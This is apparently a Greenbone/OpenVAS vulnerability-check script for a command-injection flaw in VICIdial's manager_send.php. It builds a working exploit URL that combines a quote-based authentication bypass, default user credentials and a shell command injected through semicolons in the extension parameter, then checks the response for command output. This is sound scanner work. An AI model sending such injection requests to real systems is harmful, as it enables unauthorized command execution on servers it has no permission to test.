CPE = "cpe:/a:vicidial:vicidial";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103821" );
	script_bugtraq_id( 63288, 63340 );
	script_cve_id( "CVE-2013-4468", "CVE-2013-4467" );
	script_version( "2021-06-16T14:43:08+0000" );
	script_tag( name: "cvss_base", value: "6.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:P/A:P" );
	script_name( "VICIdial 'manager_send.php' Command Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/63288" );
	script_xref( name: "URL", value: "http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/" );
	script_tag( name: "last_modification", value: "2021-06-16 14:43:08 +0000 (Wed, 16 Jun 2021)" );
	script_tag( name: "creation_date", value: "2013-10-25 14:23:59 +0200 (Fri, 25 Oct 2013)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_vicidial_detect.sc" );
	script_mandatory_keys( "vicidial/http/detected" );
	script_require_ports( "Services/www", 443 );
	script_tag( name: "summary", value: "VICIdial is prone to a command-injection vulnerability because
  the application fails to properly sanitize user-supplied input." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary commands
  in the context of the affected application." );
	script_tag( name: "insight", value: "In multiple locations, there are calls to passthru() that do not
  perform any filtering or sanitization on the input." );
	script_tag( name: "affected", value: "VICIdial 2.7RC1, 2.7 and 2.8-403a are vulnerable.
  Other versions may also be affected." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
for pattern in keys( cmds ) {
	for user in make_list( "VDCL",
		 "VDAD" ) {
		url = "/agc/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&" + "session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B" + cmds[pattern] + "%3B&user=" + user + "&pass=donotedit";
		if(buf = http_vuln_check( port: port, url: url, pattern: pattern )){
			data = "It was possible to execute the \"" + cmds[pattern] + "\" command.\n\nRequest:\n\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\n\nResponse:\n\n" + buf + "\n\n";
			security_message( port: port, data: data );
			exit( 0 );
		}
	}
}
exit( 99 );

